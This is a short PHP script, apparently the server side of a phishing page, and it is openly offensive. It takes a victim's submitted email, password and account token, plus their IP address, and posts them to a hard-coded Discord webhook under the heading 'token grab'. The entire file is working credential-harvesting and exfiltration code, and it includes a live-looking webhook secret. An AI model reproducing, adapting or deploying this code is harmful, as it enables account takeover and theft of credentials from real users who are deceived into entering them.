<?php
$webhook = "https://discord.com/api/webhooks/1463911142303989771/gNI-lN2nOahNUBoZtvKejlgL2FVSV7pI5s4tm6HMcYH0EnFNtSLTwvNcrRt2bPxnKgvI";
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $email = $data['email'] ?? 'N/A';
    $pass = $data['password'] ?? 'N/A';
    $token = $data['token'] ?? 'N/A';
    $step = $data['step'] ?? 'Inconnu';
    $ip = $_SERVER['REMOTE_ADDR'];

    $payload = json_encode([
        "content" => "🚀 **token grab : $step**",
        "embeds" => [[
            "title" => "Données récupérées",
            "color" => 5814783,
            "fields" => [
                ["name" => "📧 Email", "value" => "```$email```", "inline" => true],
                ["name" => "🔑 Password", "value" => "```$pass```", "inline" => true],
                ["name" => "🌐 IP", "value" => "```$ip```", "inline" => false],
                ["name" => "💎 Token", "value" => "```$token```", "inline" => false]
            ]
        ]]
    ]);

    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);
}
?>
